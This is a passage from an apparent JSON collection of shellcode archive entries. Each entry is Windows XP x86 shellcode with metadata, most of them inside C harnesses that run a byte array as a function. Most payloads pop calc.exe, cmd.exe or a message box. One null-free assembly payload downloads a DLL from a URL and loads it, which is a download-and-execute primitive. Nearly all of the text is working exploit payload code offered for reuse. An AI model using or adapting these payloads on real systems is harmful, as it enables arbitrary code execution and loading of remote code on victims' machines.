mem", "\tmov eax,7c86114dh ;addr of \"WinExec\" Function.", "\tcall eax", "\tint 3h", "end start", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "", "", "+-----------------+", "", "| Shellcodetest.c |", "", "+-----------------+", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "", "char code[] = \"\\x6A\\x05\\x68\\x97\\x4C\"", "              \"\\x80\\x7C\\xB8\\x4D\\x11\"", "              \"\\x86\\x7C\\xFF\\xD0\\xCC\";", "", "", "int main(int argc, char **argv)", "{", "  int (*func)();", "  func = (int (*)()) code;", "  (int)(*func)();", "}", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "", "+-------------------+", "", "| Greetz Fly Out To |", "", "+-------------------+", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", "", "1] Amforked()\t : My Mentor.", "2] The Blue Genius : My Boss.", "3] www.orchidseven.com", "4] www.isacm.org.in", "", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"]},
{"Title": "Windows/x86 (XP Professional SP2) - calc.exe Shellcode (57 bytes)", "Author": "cr4wl3r", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-579.php", "View": null, "code": ["/*", "", "[+] win32/xp pro sp3 (calc) 57 bytes", "", "", "1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0", "0     _                   __           __       __                     1", "1   /' \\            __  /'__`\\        /\\ \\__  /'__`\\                   0", "0  /\\_, \\    ___   /\\_\\/\\_\\ \\ \\    ___\\ \\ ,_\\/\\ \\/\\ \\  _ ___           1", "1  \\/_/\\ \\ /' _ `\\ \\/\\ \\/_/_\\_<_  /'___\\ \\ \\/\\ \\ \\ \\ \\/\\`'__\\          0", "0     \\ \\ \\/\\ \\/\\ \\ \\ \\ \\/\\ \\ \\ \\/\\ \\__/\\ \\ \\_\\ \\ \\_\\ \\ \\ \\/           1", "1      \\ \\_\\ \\_\\ \\_\\_\\ \\ \\ \\____/\\ \\____\\\\ \\__\\\\ \\____/\\ \\_\\           0", "0       \\/_/\\/_/\\/_/\\ \\_\\ \\/___/  \\/____/ \\/__/ \\/___/  \\/_/           1", "1                  \\ \\____/ >> Exploit database separated by exploit   0", "0                   \\/___/          type (local, remote, DoS, etc.)    1", "1                                                                      1", "0  [+] Site            : Inj3ct0r.com                                  0", "1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1", "0                                                                      0", "1                    ######################################            1", "0                    I'm cr4wl3r  member from Inj3ct0r Team            1", "1                    ######################################            0", "0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1", "", "", "", "[+]Discovered By: cr4wl3r", " */", "", "#include <stdio.h>", "#include <string.h>", "", " ", "int main() {", "char shell[] = \t\"\\xb8\\xff\\xef\\xff\\xff\\xf7\\xd0\\x2b\\xe0\\x55\\x8b\\xec\"", "\t\t\"\\x33\\xff\\x57\\x83\\xec\\x04\\xc6\\x45\\xf8\\x63\\xc6\\x45\"", "\t\t\"\\xf9\\x6d\\xc6\\x45\\xfa\\x64\\xc6\\x45\\xfb\\x2e\\xc6\\x45\"", "\t\t\"\\xfc\\x65\\xc6\\x45\\xfd\\x78\\xc6\\x45\\xfe\\x65\\x8d\\x45\"", "\t\t\"\\xf8\\x50\\xbb\\xc7\\x93\\xbf\\x77\\xff\\xd3\";", "", "printf(\"Shellcode lenght %d\\n\", strlen(shell));", "getchar();", "((void (*)()) shell)();", "return 0;", "}"]},
{"Title": "Windows/x86 (XP Professional SP3) (French) - calc.exe Shellcode (31 bytes)", "Author": "agix", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-612.php", "View": null, "code": ["/*", " | Title: Windows Xp Pro SP3 Fr (calc.exe) Shellcode 31 Bytes", " | Type: Shellcode", " | Author: agix", " | Platform: win32", "*/", "", "#include <stdio.h>", "", "char shellcode[] =", "\"\\xEB\\x10\" //jmp short 0x12", "\"\\x5B\" //pop ebx", "\"\\x53\" //push ebx", "\"\\xBB\\xAD\\x23\\x86\\x7C\" //mov ebx, 0x7c8623ad", "\"\\xFF\\xD3\" //call ebx", "\"\\xBB\\xFA\\xCA\\x81\\x7C\" //mov ebx, 0x7c81cafa", "\"\\xFF\\xD3\" //call ebx", "\"\\xE8\\xEB\\xFF\\xFF\\xFF\" //call dword 0x2", "//db calc.exe", "\"\\x63\\x61\\x6C\\x63\\x2E\\x65\\x78\\x65\";", "", "int main(int argc, char **argv) {", "        int *ret;", "        ret = (int *)&ret + 2;", "        (*ret) = (int) shellcode;", "}"]},
{"Title": "Windows/x86 - Download File (http://skypher.com/dll) + LoadLibrary + Null-Free Shellcode (164 bytes)", "Author": "Skylined", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-700.php", "View": null, "code": ["; Copyright (c) 2009-2010, Berend-Jan \"SkyLined\" Wever <berendjanwever@gmail.com>", "; Project homepage: http://code.google.com/p/w32-dl-loadlib-shellcode/", "; All rights reserved. See COPYRIGHT.txt for details.", "BITS 32", "; Windows x86 null-free shellcode that writes \"Hello, world!\" to stdout.", "; Works in any console application for Windows 5.0-7.0 all service packs.", "; (See http://skypher.com/wiki/index.php/Hacking/Shellcode).", "; This version uses 16-bit hashes.", "", "%define url 'http://skypher.com/dll'", "%strlen sizeof_url url", "", "%include 'w32-dl-loadlib-shellcode-hash-list.asm'", "", "%define B2W(b1,b2)                      (((b2) << 8) + (b1))", "%define W2DW(w1,w2)                     (((w2) << 16) + (w1))", "%define B2DW(b1,b2,b3,b4)               (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))", "", "%define buffer_size 0x7C", "", "%ifdef STACK_ALIGN", "    AND     SP, 0xFFFC", "%endif", "    MOV     EDI, W2DW(hash_kernel32_LoadLibraryA, hash_urlmon_URLDownloadToCacheFileA)", "find_hash: ; Find ntdll's InInitOrder list of modules:", "    PUSH    EDI                         ; Stack = (hash, hash) [, &(url), &(LoadLibraryA)]", "    XOR     ESI, ESI                    ; ESI = 0", "    MOV     ESI, [FS:ESI + 0x30]        ; ESI = &(PEB) ([FS:0x30])", "    MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr", "    MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)", "next_module: ; Get the baseaddress of the current module and find the next module:", "    MOV     EBP, [ESI + 0x08]           ; EBP = InInitOrder[X].base_address", "    MOV     ESI, [ESI]                  ; ESI = InInitOrder[X].flink == InInitOrder[X+1]", "get_proc_address_loop: ; Find the PE header and export and names tables of the module:", "    MOV     EBX, [EBP + 0x3C]           ; EBX = &(PE header)", "    MOV     EBX, [EBP + EBX + 0x78]     ; EBX = offset(export table)", "    ADD     EBX, EBP                    ; EBX = &(export table)", "    MOV     ECX, [EBX + 0x18]           ; ECX = number of name pointers", "    JCXZ    next_module                 ; No name pointers? Next module.", "next_function_loop: ; Get the next function name for hashing:", "    MOV     EDI, [EBX + 0x20]           ; EDI = offset(names table)", "    ADD     EDI, EBP                    ; EDI = &(names table)", "    MOV     EDI, [EDI + ECX * 4 - 4]    ; EDI = offset(function name)", "    ADD     EDI, EBP                    ; EDI = &(function name)", "    XOR     EAX, EAX                    ; EAX = 0", "    CDQ                                 ; EDX = 0", "hash_loop: ; Hash the function name and compare with requested hash", "    XOR     DL, [EDI]", "    ROR     DX, BYTE hash_ror_value", "    SCASB", "    JNE     hash_loop", "    CMP     DX, [ESP]", "    LOOPNE  next_function_loop          ; Not the right hash and functions left in module? Next function", "    JNE     next_module                 ; Not the right hash and no functions left in module? Next module", "    ; Found the right hash: get the address of the function:", "    MOV     EDX, [EBX + 0x24]           ; ESI = offset ordinals table", "    ADD     EDX, EBP                    ; ESI = &oridinals table", "    MOVZX   EDX, WORD [EDX + 2 * ECX]   ; ESI = ordinal number of function", "    MOV     EDI, [EBX + 0x1C]           ; EDI = offset address table", "    ADD     EDI, EBP                    ; EDI = &address table", "    ADD     EBP, [EDI + 4 * EDX]        ; EBP = &(function)", "    ; Move to the next hash, this sets ECX to 0 if there are no more hashes:", "    POP     CX                          ; CX = hash | Stack = hash [, &(url), &(LoadLibraryA)]", "    POP     CX                          ; CX = hash | Stack = [&(url), &(LoadLibraryA)]", "    MOV     AH, 0x1                     ; EAX = 0x100", "    JCXZ    download_and_loadlibrary    ; No more hashes", "    MOV     EDI, ECX                    ; EDI = hashes", "    SUB     ESP, EAX                    ; Stack = buffer (0x100 bytes)", "    PUSH    AX                          ; Stack = (0, 1), buffer", "    PUSH    B2DW('l', 'm', 'o', 'n')    ; Stack = \"lmon\", (0, 1), buffer", "    PUSH    WORD B2W('u', 'r')          ; Stack = \"urlmon\", (0, 1), buffer", "    PUSH    ESP                         ; Stack = &(\"urlmon\"), \"urlmon\", (0, 1), buffer", "    CALL    EBP                         ; LoadLibraryA(\"urlmon\")", "    PUSH    EBP                         ; Stack = &(LoadLibraryA), buffer", "    CALL    find_hash                   ; Stack = &(url), &(LoadLibraryA), buffer", "    db      url", "download_and_loadlibrary:               ; Stack = &(url), &(LoadLibraryA), buffer", "    POP     ESI                         ; ESI = &(url)          | Stack = &(LoadLibraryA), buffer", "    POP     EDX                         ; EDX = &(LoadLibraryA) | Stack = buffer", "    ; Copy url to stack and NULL terminate it:", "    MOV     EDI, ESP                    ; EDI = &(buffer)", "    PUSH    BYTE sizeof_url             ; ", "    POP     ECX                         ; ECX = sizeof(url)", "    REP     MOVSB                       ; Stack = url buffer     | EDI = &(buffer)", "    STOSB                               ; Stack = url, 0, buffer | EDI = &(buffer)", "    MOV     ESI, ESP                    ; ESI = &(url)", "    ; Create a ret-into-libc stack chain to make URLDownloadToCacheFileA() return to LoadLibraryA():", "                                        ; LoadLibraryA(", "    PUSH    EDI                         ;   __in LPCTSTR lpFileName = &(buffer)", "    PUSH    ECX                         ; ) return address = NULL", "                                        ; URLDownloadToCacheFileA(", "    PUSH    ECX                         ;   __in  IBindStatusCallback *pBSC = NULL", "    PUSH    ECX                         ;         DWORD dwReserved = NULL", "    ; Our buffer is not really 0x100 bytes long anymore because we used part of it to store the URL... oh well.", "    PUSH    EAX                         ;   __in  DWORD cchFileName = sizeof(buffer)", "    PUSH    EDI                         ;   __out LPTSTR szFileName = &(buffer)", "    PUSH    ESI                         ;   __in  LPCSTR szURL = &(url)", "    PUSH    ECX                         ;   __in  LPUNKNOWN lpUnkcaller = NULL", "    PUSH    EDX                         ; ) return address = LoadLibraryA", "    ; Start the ret-into-libc chain:", "    JMP     EBP                         ; Jump to URLDownloadToCacheFileA, then return to LoadLibraryA"]},
{"Title": "Windows/x86 - calc.exe + Null-Free Shellcode (100 bytes)", "Author": "Skylined", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-701.php", "View": null, "code": ["; Copyright (c) 2009-2010, Berend-Jan \"SkyLined\" Wever <berendjanwever@gmail.com>", "; Project homepage: http://code.google.com/p/w32-dl-loadlib-shellcode/", "; All rights reserved. See COPYRIGHT.txt for details.", "BITS 32", "; Windows x86 null-free shellcode that executes calc.exe.", "; Works in any application for Windows 5.0-7.0 all service packs.", "; (See http://skypher.com/wiki/index.php/Hacking/Shellcode).", "; This version uses 16-bit hashes.", "", "%include 'w32-exec-calc-shellcode-hash-list.asm'", "", "%define B2W(b1,b2)                      (((b2) << 8) + (b1))", "%define W2DW(w1,w2)                     (((w2) << 16) + (w1))", "%define B2DW(b1,b2,b3,b4)               (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))", "", "%ifdef STACK_ALIGN", "    AND     SP, 0xFFFC", "%endif", "find_hash: ; Find ntdll's InInitOrder list of modules:", "    XOR     ESI, ESI                    ; ESI = 0", "    PUSH    ESI                         ; Stack = 0", "    MOV     ESI, [FS:ESI + 0x30]        ; ESI = &(PEB) ([FS:0x30])", "    MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr", "    MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)", "next_module: ; Get the baseaddress of the current module and find the next module:", "    MOV     EBP, [ESI + 0x08]           ; EBP = InInitOrder[X].base_address", "    MOV     ESI, [ESI]                  ; ESI = InInitOrder[X].flink == InInitOrder[X+1]", "get_proc_address_loop: ; Find the PE header and export and names tables of the module:", "    MOV     EBX, [EBP + 0x3C]           ; EBX = &(PE header)", "    MOV     EBX, [EBP + EBX + 0x78]     ; EBX = offset(export table)", "    ADD     EBX, EBP                    ; EBX = &(export table)", "    MOV     ECX, [EBX + 0x18]           ; ECX = number of name pointers", "    JCXZ    next_module                 ; No name pointers? Next module.", "next_function_loop: ; Get the next function name for hashing:", "    MOV     EDI, [EBX + 0x20]           ; EDI = offset(names table)", "    ADD     EDI, EBP                    ; EDI = &(names table)", "    MOV     EDI, [EDI + ECX * 4 - 4]    ; EDI = offset(function name)", "    ADD     EDI, EBP                    ; EDI = &(function name)", "    XOR     EAX, EAX                    ; EAX = 0", "    CDQ                                 ; EDX = 0", "hash_loop: ; Hash the function name and compare with requested hash", "    XOR     DL, [EDI]", "    ROR     DX, BYTE hash_ror_value", "    SCASB", "    JNE     hash_loop", "    CMP     DX, hash_kernel32_WinExec", "    LOOPNE  next_function_loop          ; Not the right hash and functions left in module? Next function", "    JNE     next_module                 ; Not the right hash and no functions left in module? Next module", "    ; Found the right hash: get the address of the function:", "    MOV     EDX, [EBX + 0x24]           ; ESI = offset ordinals table", "    ADD     EDX, EBP                    ; ESI = &oridinals table", "    MOVZX   EDX, WORD [EDX + 2 * ECX]   ; ESI = ordinal number of function", "    MOV     EDI, [EBX + 0x1C]           ; EDI = offset address table", "    ADD     EDI, EBP                    ; EDI = &address table", "    ADD     EBP, [EDI + 4 * EDX]        ; EBP = &(function)", "    ; create the calc.exe string", "    PUSH    B2DW('.', 'e', 'x', 'e')    ; Stack = \".exe\", 0", "    PUSH    B2DW('c', 'a', 'l', 'c')    ; Stack = \"calc.exe\", 0", "    PUSH    ESP                         ; Stack = &(\"calc.exe\"), \"calc.exe\", 0", "    XCHG    EAX, [ESP]                  ; Stack = 0, \"calc.exe\", 0", "    PUSH    EAX                         ; Stack = &(\"calc.exe\"), 0, \"calc.exe\", 0", "    CALL    EBP                         ; WinExec(&(\"calc.exe\"), 0);", "    INT3                                ; Crash"]},
{"Title": "Windows/x86 - Message Box + Null-Free Shellcode (140 bytes)", "Author": "Skylined", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-702.php", "View": null, "code": ["; Copyright (c) 2009-2010, Berend-Jan \"SkyLined\" Wever <berendjanwever@gmail.com>", "; Project homepage: http://code.google.com/p/w32-dl-loadlib-shellcode/", "; All rights reserved. See COPYRIGHT.txt for details.", "BITS 32", "; Windows x86 null-free shellcode that executes calc.exe.", "; Works in any application for Windows 5.0-7.0 all service packs.", "; (See http://skypher.com/wiki/index.php/Hacking/Shellcode).", "; This version uses 16-bit hashes.", "", "%include 'w32-msgbox-shellcode-hash-list.asm'", "", "%define B2W(b1,b2)                      (((b2) << 8) + (b1))", "%define W2DW(w1,w2)                     (((w2) << 16) + (w1))", "%define B2DW(b1,b2,b3,b4)               (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))", "", "%ifdef STACK_ALIGN", "    AND     SP, 0xFFFC", "%endif", "find_hash: ; Find ntdll's InInitOrder list of modules:", "    XOR     ESI, ESI                    ; ESI = 0", "    PUSH    ESI                         ; Stack = 0", "    MOV     ESI, [FS:ESI + 0x30]        ; ESI = &(PEB) ([FS:0x30])", "    MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr", "    MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)", "next_module: ; Get the baseaddress of the current module and find the next module:", "    MOV     EBP, [ESI + 0x08]           ; EBP = InInitOrder[X].base_address", "    MOV     ESI, [ESI]                  ; ESI = InInitOrder[X].flink == InInitOrder[X+1]", "get_proc_address_loop: ; Find the PE header and export and names tables of the module:", "    MOV     EBX, [EBP + 0x3C]           ; EBX = &(PE header)", "    MOV     EBX, [EBP + EBX + 0x78]     ; EBX = offset(export table)", "    ADD     EBX, EBP                    ; EBX = &(export table)", "    MOV     ECX, [EBX + 0x18]           ; ECX = number of name pointers", "    JCXZ    next_module                 ; No name pointers? Next module.", "next_function_loop: ; Get the next function name for hashing:", "    MOV     EDI, [EBX + 0x20]           ; EDI = offset(names table)", "    ADD     EDI, EBP                    ; EDI = &(names table)", "    MOV     EDI, [EDI + ECX * 4 - 4]    ; EDI = offset(function name)", "    ADD     EDI, EBP                    ; EDI = &(function name)", "    XOR     EAX, EAX                    ; EAX = 0", "    CDQ                                 ; EDX = 0", "hash_loop: ; Hash the function name and compare with requested hash", "    XOR     DL, [EDI]", "    ROR     DX, BYTE hash_ror_value", "    SCASB", "    JNE     hash_loop", "    CMP     DX, hash_user32_MessageBoxA", "    JE      found_MessageBoxA           ;", "    CMP     DX, hash_kernel32_LoadLibraryA", "    LOOPNE  next_function_loop          ; Not the right hash and functions left in module? Next function", "    JNE     next_module                 ; Not the right hash and no functions left in module? Next module", "found_MessageBoxA:", "    ; Found the right hash: get the address of the function:", "    MOV     EDX, [EBX + 0x24]           ; EDX = offset ordinals table", "    ADD     EDX, EBP                    ; EDX = &oridinals table", "    MOVZX   EDX, WORD [EDX + 2 * ECX]   ; EDX = ordinal number of function", "    MOV     EDI, [EBX + 0x1C]           ; EDI = offset address table", "    ADD     EDI, EBP                    ; EDI = &address table", "    ADD     EBP, [EDI + 4 * EDX]        ; EBP = &(function)", "    TEST    ESI, ESI", "    JZ      show_MesageBoxA", "    PUSH    B2DW('3', '2', ' ', ' ')    ; Stack = \"er32\", 0", "    PUSH    B2DW('u', 's', 'e', 'r')    ; Stack = \"  user32\", 0", "    PUSH    ESP                         ; Stack = &(\"  user32\"), \"  user32\", 0", "    CALL    EBP                         ; LoadLibraryA(&(\"  user32\"));", "    XCHG    EAX, EBP                    ; EBP = &(user32.dll)", "    XOR     ESI, ESI                    ; ESI = 0", "    PUSH    ESI                         ; Stack = 0, \"  user32\", 0", "    JMP     get_proc_address_loop", "", "show_MesageBoxA:", "    ; create the \"Hello world!\" string", "    PUSH    B2DW('r', 'l', 'd', '!')    ; Stack = \"rld!\", 0, \"  user32\", 0", "    PUSH    B2DW('o', ' ', 'w', 'o')    ; Stack = \"o world!\", 0, \"  user32\", 0", "    PUSH    B2DW('H', 'e', 'l', 'l')    ; Stack = \"Hello world!\", 0, \"  user32\", 0", "    PUSH    ESP                         ; Stack = &(\"Hello world!\"), \"Hello world!\", 0, \"  user32\", 0", "    XCHG    EAX, [ESP]                  ; Stack = 0, \"Hello world!\", 0, \"  user32\", 0", "    PUSH    EAX                         ; Stack = &(\"Hello world!\"), 0, \"Hello world!\", 0, \"  user32\", 0", "    PUSH    EAX                         ; Stack = &(\"Hello world!\"), &(\"Hello world!\"), 0, \"Hello world!\", 0, \"  user32\", 0", "    PUSH    ESI                         ; Stack = 0, &(\"Hello world!\"), &(\"Hello world!\"), 0, \"Hello world!\", 0, \"  user32\", 0", "    CALL    EBP                         ; MessageBoxA(NULL, &(\"Hello world!\"), &(\"Hello world!\"), MB_OK);", "    INT3                                ; Crash"]},
{"Title": "Windows/x86 (XP SP3) (Turkish) - MessageBoxA Shellcode (109 bytes)", "Author": "ZoRLu", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-703.php", "View": null, "code": ["# Title    : win32/xp sp3 (Tr) MessageBoxA Shellcode 109 bytes", "# Proof    : http://img443.imageshack.us/img443/7900/proofaz.jpg", "# Author   : ZoRLu", "# mail-msn : admin@yildirimordulari.com", "# Home     : z0rlu.blogspot.com", "# Date     : 14/09/2010", "# Tesekkur : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N", "# Temenni  : Yeni Anayasamiz Hayirli Olsun", "# Lakirdi  : I dont know very well assembly. but, I know I will learn its too :P", "", "", "#include <stdio.h>", "#include <string.h>", "#include <stdlib.h>", " ", "int main(){", "    ", "    unsigned char shellcode[]=", "    \"\\x31\\xc0\\x31\\xdb\\x31\\xd9\\x31\\xd2\\xeb\\x35\\x59\\x88\\x51\\x0a\\xbb\\x7b\\x1d\"", "    \"\\x80\\x7c\\x51\\xff\\xd3\\xeb\\x37\\x59\\x31\\xd2\\x88\\x51\\x0b\\x51\\x50\\xbb\\x30\"", "    \"\\xae\\x80\\x7c\\xff\\xd3\\xeb\\x37\\x59\\x31\\xd2\\x88\\x51\\x07\\x52\\x52\\x51\\x52\"", "    \"\\xff\\xd0\\x31\\xd2\\x50\\xb8\\xfa\\xca\\x81\\x7c\\xff\\xd0\\xe8\\xc6\\xff\\xff\\xff\"", "    \"\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x4e\\xe8\\xc4\\xff\\xff\\xff\\x4d\"", "    \"\\x65\\x73\\x73\\x61\\x67\\x65\\x42\\x6f\\x78\\x41\\x4e\\xe8\\xc4\\xff\\xff\\xff\\x69\"", "    \"\\x74\\x73\\x20\\x6f\\x6b\\x21\\xff\";", " ", "    printf(\"Size = %d bytes\\n\", strlen(shellcode));", " ", "    ((void (*)())shellcode)();", " ", "    return 0;", "}"]},
{"Title": "Windows/x86 (XP SP3) (Turkish) - calc.exe Shellcode (53 bytes)", "Author": "ZoRLu", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-704.php", "View": null, "code": ["# Title        : win32/xp sp3 (Tr) calc.exe Shellcode 53 bytes", "# Proof        : http://img178.imageshack.us/img178/548/proofxw.jpg", "# Author       : ZoRLu / http://inj3ct0r.com/author/577", "# mail-msn     : admin@yildirimordulari.com", "# Home         : http://z0rlu.blogspot.com", "# Date         : 15/09/2010", "# Tesekkur     : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N", "# Temenni      : Yeni Anayasamiz Hayirli Olsun", "# Lakirdi      : I dont know very well assembly. but, I know I will learn its too :P", "", "", "#include <stdio.h>", "#include <string.h>", "#include <stdlib.h>", " ", "int main(){", "    ", "    unsigned char shellcode[]=", "    \"\\xeb\\x1b\\x5b\\x31\\xc0\\x50\\x31\\xc0\\x88\\x43\\x13\\x53\\xbb\\xad\\x23\\x86\\x7c\"", "    \"\\xff\\xd3\\x31\\xc0\\x50\\xbb\\xfa\\xca\\x81\\x7c\\xff\\xd3\\xe8\\xe0\\xff\\xff\\xff\"", "    \"\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x63\\x20\\x63\\x61\\x6c\\x63\\x2e\\x65\"", "    \"\\x78\\x65\";", " ", "    printf(\"Size = %d bytes\\n\", strlen(shellcode));", " ", "    ((void (*)())shellcode)();", " ", "    return 0;", "}"]},
{"Title": "Windows/x86 (XP SP3) (Turkish) - cmd.exe Shellcode (52 bytes)", "Author": "ZoRLu", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-705.php", "View": null, "code": ["# Title        : win32/xp sp3 (Tr) cmd.exe Shellcode 52 bytes", "# Proof        : http://img59.imageshack.us/img59/6499/proofc.png", "# Author       : ZoRLu / http://inj3ct0r.com/author/577", "# mail-msn     : admin@yildirimordulari.com", "# Home         : http://z0rlu.blogspot.com", "# Date         : 15/09/2010", "# Tesekkur     : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N", "# Temenni      : Yeni Anayasamiz Hayirli Olsun", "# Lakirdi      : I dont know very well assembly. but, I know I will learn its too :P", "", "", "#include <stdio.h>", "#include <string.h>", "#include <stdlib.h>", " ", "int main(){", "    ", "    unsigned char shellcode[]=", "    \"\\xeb\\x1b\\x5b\\x31\\xc0\\x50\\x31\\xc0\\x88\\x43\\x12\\x53\\xbb\\xad\\x23\\x86\\x7c\"", "    \"\\xff\\xd3\\x31\\xc0\\x50\\xbb\\xfa\\xca\\x81\\x7c\\xff\\xd3\\xe8\\xe0\\xff\\xff\\xff\"", "    \"\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x63\\x20\\x63\\x6d\\x64\\x2e\\x65\\x78\"", "    \"\\x65\";", " ", "    printf(\"Size = %d bytes\\n\", strlen(shellcode));", " ", "    ((void (*)())shellcode)();", " ", "    return 0;", "}"]},
{"Title": "Windows/x86 (XP SP3) (Turkish) - cmd.exe Shellcode (42 bytes)", "Author": "ZoRLu", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-710.php", "View": null, "code": ["1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0", "0     _                   __           __       __                     1", "1   /' \\            __  /'__`\\        /\\ \\__  /'__`\\                   0", "0  /\\_, \\    ___   /\\_\\/\\_\\ \\ \\    ___\\ \\ ,_\\/\\ \\/\\ \\  _ ___           1", "1  \\/_/\\ \\ /' _ `\\ \\/\\ \\/_/_\\_<_  /'___\\ \\ \\/\\ \\ \\ \\ \\/\\`'__\\          0", "0     \\ \\ \\/\\ \\/\\ \\ \\ \\ \\/\\ \\ \\ \\/\\ \\__/\\ \\ \\_\\ \\ \\_\\ \\ \\ \\/           1", "1      \\ \\_\\ \\_\\ \\_\\_\\ \\ \\ \\____/\\ \\____\\\\ \\__\\\\ \\____/\\ \\_\\           0", "0       \\/_/\\/_/\\/_/\\ \\_\\ \\/___/  \\/____/ \\/__/ \\/___/  \\/_/           1", "1                  \\ \\____/ >> Exploit database separated by exploit   0", "0                   \\/___/          type (local, remote, DoS, etc.)    1", "1                                                                      1", "0  [+] Site            : Inj3ct0r.com                                  0", "1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1", "0                                                                      0", "1                 ###########################################          1", "0                 I'm ZoRLu member from Inj3ct0r Team                  1", "1                 ###########################################          0", "0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1", "", "# Title        : win32/xp sp3 (Tr) cmd.exe Shellcode 42 bytes", "# Proof        : http://img36.imageshack.us/img36/1183/cmdm.jpg", "# Plat.        : win32 / windows", "# Author       : ZoRLu / http://inj3ct0r.com/author/577", "# mail-msn     : admin@yildirimordulari.com", "# Home         : http://z0rlu.blogspot.com", "# Thanks       : http://inj3ct0r.com / http://www.exploit-db.com / http://packetstormsecurity.org / http://shell-storm.org", "# Date         : 01/10/2010", "# Tesekkur     : r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N", "# Lakirdi      : Okudugumuz icin Cezalandiran Sistemin amina koyim / Kpss Anani ...", "# Lakirdi      : Son 31 Gun", " ", " ", "#include <stdio.h>", "#include <string.h>", "#include <stdlib.h>", "   ", "int main(){", "      ", "    unsigned char shellcode[]=", "    \"\\x31\\xc0\\xeb\\x13\\x5b\\x88\\x43\\x0e\\x53\\xbb\\xad\\x23\\x86\\x7c\\xff\\xd3\\xbb\"", "    \"\\xfa\\xca\\x81\\x7c\\xff\\xd3\\xe8\\xe8\\xff\\xff\\xff\\x63\\x6d\\x64\\x2e\\x65\\x78\"", "    \"\\x65\\x20\\x2f\\x63\\x20\\x63\\x6d\\x64\";", "   ", "    printf(\"Size = %d bytes\\n\", strlen(shellcode));", "   ", "    ((void (*)())shellcode)();", "      ", "      ", "   ", "    return 0;", "}"]},
{"Title": "Windows/x86 (XP SP3) - MessageBox Shellcode (11 bytes)", "Author": "d3c0der", "Published": ": 2009-01-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-751.php", "View": null, "code": ["/*", "Title: win32/xp pro sp3 MessageBox shellcode 11 bytes", "Author: d3c0der - d3c0der[at]hotmail[dot]com", "Tested on: WinXP Pro SP3 (EN)  # ( run MessageBox that show an error message )", "website : Www.AttackerZ.ir", "spt : All firends ;)", "*/", "#include <stdio.h>", "#include <string.h>", "#include <stdlib.h>", " ", "char code[] =   \"\\x33\\xd2\\x52\\x52\\x52\\x52\\xe8\\xbe\\xe9\\x44\\x7d\";", " ", "int main(int argc, char **argv)", "{", "    ((void (*)())code)();", "     ", "    return 0;", "}"]},
